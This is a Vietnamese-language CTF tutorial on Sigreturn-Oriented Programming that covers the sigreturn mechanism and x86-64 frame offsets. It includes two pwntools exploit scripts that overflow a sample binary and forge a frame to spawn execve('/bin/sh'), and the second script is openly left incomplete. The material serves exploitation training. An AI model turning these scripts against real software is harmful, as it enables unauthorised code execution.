SROP

Sigreturn-Oriented Programming: lạm dụng syscall rt_sigreturn (nr=15) — syscall này khôi phục TOÀN BỘ thanh ghi từ một "signal frame" trên stack. Nếu ta kiểm soát stack → dựng frame giả → set mọi thanh ghi cùng lúc chỉ với 1 gadget syscall + đặt được rax=15. Bài này đi byte-table frame offset thật.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Cơ chế kernel: khi một signal handler xong, kernel gọi sigreturn để khôi phục trạng thái CPU (mọi thanh ghi + rip + rsp) từ một sigcontext frame mà kernel đã lưu trên stack.

Lạm dụng: ta tự dựng frame giả trên stack, đặt rax=15 rồi syscall → kernel "khôi phục" theo frame của ta → set rax, rdi, rsi, rdx, rip, rsp... tất cả cùng lúc. Thường để chạy execve("/bin/sh",0,0).

Khi nào: gadget quá nghèo (không có pop rdi/rsi/rdx) nhưng có syscall và cách đặt rax=15 + ghi được ~0xf8 byte frame.

Nếu chỉ nhớ một điều: sigreturn set MỌI thanh ghi từ stack. rax=15 + syscall + frame giả = kiểm soát toàn bộ CPU.

⚡ COMBAT CARD — dán chạy khi đang thi
🚦 Dùng khi

Gadget nghèo (không pop rsi/rdx) nhưng có syscall; ret và cách set rax=15 · overflow đủ dài cho frame (~0xf8 byte) · biết địa chỉ "/bin/sh" & syscall gadget.

⚡ pwntools SigreturnFrame 
frame = SigreturnFrame()
frame.rax = 59                 # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0

🔢 Số quan trọng 
rt_sigreturn = 15     execve = 59     frame = 0xf8 byte
🎯 Đặt rax=15

Cách: pop rax; ret → 15 · hoặc gọi read trả về số byte đọc (ép =15) · hoặc syscall nào trả 15 vào rax. Static thường có pop rax; ret.

⚠️ Bẫy

frame.rip phải trỏ syscall (để chạy execve sau khi set rax=59). frame.rsp nên trỏ vùng hợp lệ (bss) tránh crash. cs/ss phải đúng (SigreturnFrame set sẵn).

01 / NỀN TẢNG BẮT BUỘC

Signal & sigreturn

Khi tiến trình nhận signal (vd SIGSEGV), kernel lưu toàn bộ trạng thái CPU (mọi thanh ghi) vào một sigcontext frame trên stack, rồi chạy handler. Khi handler xong, nó gọi syscall rt_sigreturn; kernel đọc frame đó và khôi phục lại mọi thanh ghi để tiếp tục như chưa có gì. Vấn đề bảo mật: sigreturn không kiểm tra frame có phải do kernel tạo hay không — nên attacker có thể dựng frame giả.

Định nghĩa nhanh

SROP

Lạm dụng sigreturn để set thanh ghi.

sigcontext frame

Struct ~0xf8 byte chứa mọi thanh ghi.

rt_sigreturn

syscall 15 — khôi phục CPU từ frame.

SigreturnFrame

pwntools class dựng frame.

syscall gadget

Lệnh syscall; ret.

universal

Chỉ cần 1 syscall gadget → set mọi reg.

02 / VÌ SAO CÓ KỸ THUẬT

Một gadget set tất cả

ROP thường cần nhiều gadget riêng (pop rdi, pop rsi, pop rdx...). Khi binary gadget-nghèo, điều đó bất khả. SROP đổi bài: chỉ cần một gadget syscall và cách đặt rax=15, bạn set được toàn bộ thanh ghi trong một lần — kể cả rsp, rip. Bratus & nhóm (2014) chỉ ra đây là nguyên thủy cực mạnh, đặc biệt với binary nhỏ/static. Cũng dùng để stack pivot (set rsp) hay gọi mprotect.

03 / FRAME · MỤC LÕI

sigcontext frame khôi phục mọi thứ

Luồng 2 bước

1

rax=15 + syscall (sigreturn)

Kernel bắt đầu đọc frame tại rsp hiện tại.

2

Khôi phục → chạy

Mọi thanh ghi = giá trị trong frame; rip=syscall gadget → chạy execve (vì rax=59 trong frame).

04 / ĐẶT rax = 15

Ba cách thường dùng

1

pop rax; ret → 15

Đơn giản nhất nếu có gadget (static hay có).

2

read trả về 15

read(0, buf, 15) trả rax = số byte đọc = 15 nếu bạn gửi đúng 15 byte. Dùng khi không có pop rax.

3

syscall sẵn có

Một số binary có đoạn mov rax,15; syscall (sigreturn trampoline). Hiếm nhưng tiện.

Mẹo readTrick "read trả 15" rất hay trong đề tiny-binary: gửi đúng 15 byte → rax=15 → syscall kế là sigreturn. pwntools: canh độ dài input.
05 / BYTE-TABLE FRAME

Offset các thanh ghi trong frame (x86-64)

Frame (phần uc_mcontext) bắt đầu tại rsp khi sigreturn chạy. Các offset chính (pwntools SigreturnFrame tự điền; đây để hiểu & forge tay):

OffsetTrườngOffsetTrường
+0x28r8+0x88rdx
+0x30r9+0x90rax
+0x38r10+0x98rcx
+0x40r11+0xA0rsp
+0x48r12+0xA8rip
+0x68rdi+0xB0eflags
+0x70rsi+0xB8cs/gs/fs/ss
+0x78rbp+0xE0&fpstate

Frame forge tay (số thật)

+0x68rdi = 0x4c0f43 (&"/bin/sh")
+0x70rsi = 0
+0x88rdx = 0
+0x90rax = 59 (execve)
+0xA8rip = 0x40137c (syscall gadget)
+0xA0rsp = bss (vùng hợp lệ sau syscall)
+0xB8cs=0x33, ss=0x2b (SigreturnFrame set sẵn — forge tay phải đặt!)
Quên cs/ss = crashNếu forge tay mà quên cs=0x33, ss=0x2b → kernel từ chối/crash. pwntools SigreturnFrame() điền sẵn các trường segment & eflags — dùng nó thay vì gõ tay.

07 / EXPLOIT ĐẦY ĐỦ

SROP → execve("/bin/sh") (static, gadget nghèo)

// vuln.c — gcc vuln.c -o vuln -static -nostdlib ... (tiny, chỉ có syscall gadget)
// hoặc binary thường static gadget-nghèo. read overflow buffer.
# BẢN A — pop rax=15, syscall sigreturn, frame execve. Số thật.
from pwn import *
context.arch = "amd64"
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF     = 72
pop_rax = 0x44db34
syscall = 0x40137c
binsh   = next(exe.search(b"/bin/sh"))

frame = SigreturnFrame()
frame.rax = 59              # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall           # chạy execve sau khi khôi phục
frame.rsp = exe.bss(0x400)    # stack hợp lệ

payload  = b"A"*OFF
payload += p64(pop_rax) + p64(15)   # rax = 15 (rt_sigreturn)
payload += p64(syscall)                 # gọi sigreturn → đọc frame
payload += bytes(frame)                 # frame giả (0xf8 byte)
p.send(payload)
p.interactive()
Thành thậtpop_rax=0x44db34, syscall=0x40137c, binsh là của binary mẫu — ROPgadget/exe.search. Nếu không có "/bin/sh": dùng SROP gọi read ghi vào bss trước, rồi SROP thứ 2 execve(bss). SigreturnFrame() tự điền cs/ss/eflags.
# BẢN B — không có pop rax: dùng read() trả về 15 để set rax=15.
from pwn import *
context.arch = "amd64"
exe = ELF("./vuln", checksec=False); p = process(exe.path)
OFF = 72; syscall = 0x40137c; binsh = next(exe.search(b"/bin/sh"))

frame = SigreturnFrame()
frame.rax=59; frame.rdi=binsh; frame.rsi=0; frame.rdx=0
frame.rip=syscall; frame.rsp=exe.bss(0x400)

# giai đoạn 1: gọi read(0, stack, ...) — read trả số byte = rax
# gửi ĐÚNG 15 byte ở lần read đó → rax=15 → syscall kế = sigreturn
# (bố cục tùy đề; ý tưởng: ép rax=15 qua giá trị trả về của read)
# ... xem how2srop ...
p.send(b"A"*OFF + p64(syscall) + bytes(frame))
p.send(b"B"*15)       # 15 byte → read trả 15 → rax=15
p.interactive()

09 / GỠ LỖI

Khi SROP không chạy

Crash tại sigreturn

cs/ss/eflags sai. Dùng SigreturnFrame().

rax≠15

pop rax sai hoặc read trả khác. Kiểm độ dài.

rip không phải syscall

execve không trigger. frame.rip = syscall gadget.

rsp xấu

Sau execve/nếu fail, rsp trỏ vùng lỗi. Đặt frame.rsp = bss.

Overflow không đủ

Frame 0xf8 byte. Cần buffer/read dài.

Không có /bin/sh

SROP read ghi bss trước, rồi SROP execve(bss).
